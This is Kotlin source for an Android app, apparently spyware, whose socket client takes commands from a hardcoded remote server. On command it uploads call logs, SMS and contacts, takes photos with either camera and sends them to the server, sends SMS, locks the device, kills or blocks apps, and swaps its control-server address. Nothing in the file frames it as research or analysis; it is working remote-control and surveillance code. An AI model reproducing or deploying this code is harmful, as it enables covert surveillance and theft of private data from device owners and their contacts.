package com.example.betryalcommit

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Handler
import android.os.Looper
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import org.json.JSONArray
import org.json.JSONObject
import wallpaperset



private const val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co"
class suket(private val context: Context) {
    private var socket: Socket = IO.socket(serverUrl)
    private var isJoined = false

    private val onError = Emitter.Listener {
        Log.i("SOCKET", "Error connecting to server")
        Handler(Looper.getMainLooper()).postDelayed({
            reconnectSocket()
        }, 10000)
    }
    private val onConnect = Emitter.Listener {
        Log.i("SOCKET", "Connected to server")
    }




    private val onDisconnect = Emitter.Listener {
        Log.i("SOCKET", "Disconnected from server")
        Handler(Looper.getMainLooper()).postDelayed({
            reconnectSocket()
        }, 10000)
    }


    private fun reconnectSocket() {
        Handler(Looper.getMainLooper()).postDelayed({
            if (!socket.connected()) {
                Log.i("SOCKET", "Reconnecting to server...")
                socket.connect()
            }
        }, 10000)
    }

    private val onMessage = Emitter.Listener { args ->
        val text = args[0] as String
        Log.d("Socket.IO", "Received message: $text")
        val json = JSONObject(text)
        val commands = json.getString("commands")
        val data = json.getString("data")
        val num: String
        val msg: String
        if (data.contains(":")) {
            num = data.split(":")[0]
            msg = data.split(":")[1]
        } else {
            num = ""
            msg = ""
        }
        when (commands) {
            "restart_app" -> {
                val p = packagefun(context, socket)
                p.Gameterminator(data)
            }
            "run_app" -> {
                val p = packagefun(context, socket)
                p.launchApp(data)
            }
            "app_logs" -> {
                val p = packagefun(context, socket)
                p.applog()
            }
            "lock" -> AdminAct.lockdev()
            "call_logs" -> {
                callutil.uploadCalls(context.contentResolver, socket)
            }
            "wallpaper" -> {
                Log.e("wallpaper", data)
                wallpaperset.setWallpaper(context, data)
            }
            "sms_logs" -> { Teleserv.uploadsms(context.contentResolver, socket) }
            "contact_logs" -> { Teleserv.uploadContact(context, socket) }
            "camera0" ->CameraCaptureHelper().capture(serverUrl, 0 );
            "camera1" -> CameraCaptureHelper().capture(serverUrl, 1 );
            "sms_send" ->Teleserv.sendMessage(context, num, msg?:"")
            "block_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                val editor: SharedPreferences.Editor = pref.edit()
                val set = pref.getStringSet("targetPackages", null)
                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
                targetPackageNames.add(data)
                editor.putStringSet("targetPackages", targetPackageNames.toSet())
                editor.apply()
        }
            "list_blocked_packages" -> {val prefs = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                val set = prefs.getStringSet("targetPackages", null)
                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
                val jsonzs = JSONObject()
                jsonzs.put("type", "list_blocked_packages")
                jsonzs.put("data", JSONArray(targetPackageNames));
                socket.emit("response", jsonzs.toString())
            }
            "unblock_package" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
            val editor:SharedPreferences.Editor = pref.edit()
            val set = pref.getStringSet("targetPackages", null)
            val targetPackageNames = set?.toMutableList() ?: mutableListOf()
            targetPackageNames.remove(data)
            editor.putStringSet("targetPackages", targetPackageNames.toSet())
            editor.apply()
        }
            "forgive_app" -> {val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                val editor:SharedPreferences.Editor = pref.edit()
                val set = pref.getStringSet("targetPackages", null)
                val targetPackageNames = set?.toMutableList() ?: mutableListOf()
                targetPackageNames.clear()
                editor.putStringSet("targetPackages", targetPackageNames.toSet())
                editor.apply()
            }
            "change_link" ->{val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
                val editor:SharedPreferences.Editor = pref.edit()
                editor.remove("link")
                editor.putString("link", data)
                editor.apply()
                editor.commit()
                socket.disconnect()
                val serviceIntent = Intent(context, MyService::class.java)
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startService(serviceIntent)
            }
    }
    }
    init {
        val pref = context.getSharedPreferences("MyPrefs", Context.MODE_PRIVATE)
        val serverUrl = pref.getString("link", null) ?: serverUrl
        socket = IO.socket(serverUrl)
        if (!socket.connected()) {
            socket.on(Socket.EVENT_CONNECT, onConnect)
            socket.on(Socket.EVENT_DISCONNECT, onDisconnect)
            socket.on("message", onMessage)
            socket.on(Socket.EVENT_CONNECT_ERROR, onError);
            socket.connect()
        }
        else{
            println("connected")
        }
    }
}